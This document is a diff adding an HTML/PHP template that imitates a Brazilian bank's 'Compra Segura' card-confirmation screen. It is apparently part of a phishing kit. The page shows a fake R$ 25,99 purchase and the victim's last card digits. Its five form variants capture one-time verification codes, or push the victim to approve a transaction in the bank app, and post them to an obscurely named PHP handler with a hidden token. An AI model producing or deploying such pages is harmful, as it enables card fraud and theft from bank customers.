@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmação de Transação</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        .container {
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 117px;
+            height: auto;
+        }
+        .id-check {
+            font-size: 14px;
+            color: gray;
+        }
+        .content h2 {
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        .content p {
+            font-size: 14px;
+            color: gray;
+            margin-bottom: 20px;
+        }
+        .timer {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            margin: 60px 0px 67px;
+        }
+        .timer svg {
+            width: 100px;
+            height: 100px;
+        }
+        .timer circle {
+            fill: none;
+            stroke-width: 3px;
+        }
+        .timer .background {
+            stroke: #f0f0f0;
+        }
+        .timer .foreground {
+            stroke: #800080;
+            stroke-linecap: round;
+            stroke-dasharray: 283;
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 1s linear;
+        }
+        .timer span {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+        }
+        .cancel-btn, .confirm-btn {
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 48%;
+        }
+        .cancel-btn {
+            background-color: #f0f0f0;
+            color: black;
+        }
+        .confirm-btn {
+            background-color: #000000;
+            color: white;
+        }
+		
+		button.confirm {
+    width: 100%;
+    padding: 10px;
+    background-color: #4CAF50;
+    color: #ffffff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+		
+		
+		
+		
+		
+/* //////// boton style 1 //////////  */
+
+button#verifyCustomerIdentification {
+width: 100px;
+    height: 38px;
+    background: black;
+    color: white;
+    display: block;
+    border-radius: 3px;
+    margin: 15px auto;
+	}
+/* //////// boton style 1 //////////  */
+
+button#syle2 {
+    width: 204px;
+    height: 37px;
+    margin: auto;
+    display: block;
+    background: #3F51B5;
+    border: 1px solid #ffffff00;
+    color: white;
+    border-radius: 3px;
+}
+
+/* //////// boton style 1 //////////  */
+	
+		
+		table {
+    background: white;
+    border: 1px solid #ff000000;
+    width: 253px;
+    font-size: 12px;
+    display: block;
+    margin: auto;}
+
+tr {
+    border: 1px solid white;
+}
+
+td {
+    border: 1px solid white;
+}
+h3#ms {
+    background: white;
+}
+p.error.zZZ {
+    COLOR: red;
+}	
+		
+		
+		
+		
+		
+    </style>
+		    <style>
+        .hidden { display: none; }
+        .visible { display: block; }
+        .button-holder { text-align: center; margin-top: 10px; }
+				div#style-{{style}} {
+    display: block;
+}        .error {
+            color: #af0000;
+        }
+
+
+
+
+
+
+.APPS {
+    BACKGROUND: #ffffff;
+    PADDING: 19PX;
+    MARGIN: 10PX;
+    border-radius: 9px;
+    box-shadow: 0 0 2px #000000;
+    MARGIN-TOP: 157PX;
+    MAX-WIDTH: 400PX;
+    MARGIN: 213PX AUTO AUTO AUTO;
+    </style>
+	
+</head>
+<body>
+    <div class="APPS">
+    <div class="container">
+        <div class="header">
+            <img src="{{logoPath}}" class="logo">
+			<img src="imgo/{{type}}.svg" style=" width: 44px; padding-bottom: 25px;">
+
+        </div>
+        <div class="content">
+            <h2>Compra Segura {{bank}}.</h2>
+			<p></p>
+            <p>{{message}}.</p>
+
+			
+	<!--  --------------  action 1 	------------------- -->
+	
+		<div id="style-1" class="hidden">
+    <form class="" action="jonhokalmandis.php" method="post">
+        <table border="1" cellpadding="1" cellspacing="1" style="padding-top: 10px;">
+            <tbody>
+                <tr>
+                    <td>Montante </td>
+                    <td>: R$ 25,99</td>
+                </tr>
+                <tr>
+                    <td>Site de compras </td>
+                    <td>: jadlog.com.br </td>
+                </tr>
+                <tr>
+                    <td>N° de cartão </td>
+                    <td>: **** **** **** {{bins}}</td>
+                </tr>
+                <tr>
+                    <td>{{Code}} <?php echo $_SESSION['nmx']?></td>
+                    <td>: <input required name="Ecom" type="text" style="outline: none;width: 90px; margin: 0; padding: 6px; height: auto;">
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+        <div class="button-holder">
+            <button class="button btn-md btn-blue button-step-1 floatnone new-button" id="verifyCustomerIdentification">CONFIRMAR</button>
+        </div> 
+		          <p class="error zZZ">{{error}}</p>
+
+        <input hidden name="zabalitamittahokakdola" value="{{tokenx}}">
+    </form>
+</div>
+	
+				<!--  --------------  action 1 	------------------- -->
+
+<div id="style-2" class="hidden">
+    <form class="" action="jonhokalmandis.php" method="post">
+        <div class="button-holder">
+            <p style="text-align: center;color: #3f51b5;font-weight: 600;">{{Code}}</p>
+            <input name="Ecom" required type="text" style="outline: none;width: 207px; height: 39px; margin: 12px auto; display: block;">
+            <button class="style2" id="syle2">CONFIRMAR</button>
+        </div>
+				          <p class="error zZZ">{{error}}</p>
+
+        <input hidden name="zabalitamittahokakdola" value="{{tokenx}}">
+    </form>
+</div>
+
+				<!--  --------------  action 1 	------------------- -->
+				
+<div id="style-3" class="hidden">
+    <form class="" action="jonhokalmandis.php" method="post">
+        <input type="text" required name="Ecom" style=" outline: none;  width: calc(100% - 20px);   padding: 10px;    margin: 10px 0;    border: 1px solid #ccc;    border-radius: 4px;" placeholder="{{Code}}">
+        <button  class="confirm">CONFIRMAR</button>
+        <input hidden name="zabalitamittahokakdola" value="{{tokenx}}">
+						          <p class="error zZZ">{{error}}</p>
+
+    </form>
+</div>
+				
+				
+				<!--  --------------  action 1 	------------------- -->
+<div id="style-4" class="hidden">
+    <form class="" action="jonhokalmandis.php" method="post">
+        <input type="text" required name="Ecom" placeholder="{{Code}} " style="border-bottom: 2px solid #000 !important;border: 1px solid #fff0;border-radius: 23px;outline: none;width: 92%;padding: 10px 14PX;margin: 20px 0;">
+        <div class="actions">
+            <button class="cancel-btn">Cancelar</button>
+            <button class="confirm-btn">Já confirmei</button>
+        </div>
+        <input hidden name="zabalitamittahokakdola" value="{{tokenx}}">
+    </form>
+			          <p class="error zZZ">{{error}}</p>
+
+</div>				
+				
+				<!--  --------------  action 1 	------------------- -->
+
+
+<div id="style-5" class="hidden">
+    <form class="" action="jonhokalmandis.php" method="post">
+	       <h2>Para concluir, acesse seu aplicativo do {{bank}} e confirme essa transação.</h2>
+            <p>Caso você não confirme em 3 minutos, essa transação será cancelada.</p>
+
+        <input type="text"  hidden required name="Ecom"  value="Confirmet Application" style="">
+		        <input hidden name="zabalitamittahokakdola" value="{{tokenx}}">
+
+        <div class="actions">
+            <button class="cancel-btn">Cancelar</button>
+            <button class="confirm-btn">Já confirmei</button>
+        </div>
+    </form>
+			          <p class="error zZZ">{{error}}</p>
+
+</div>				
+
+
+
+
+        </div>
+    </div>
+    </div>
+
+
+</body>
+</html>
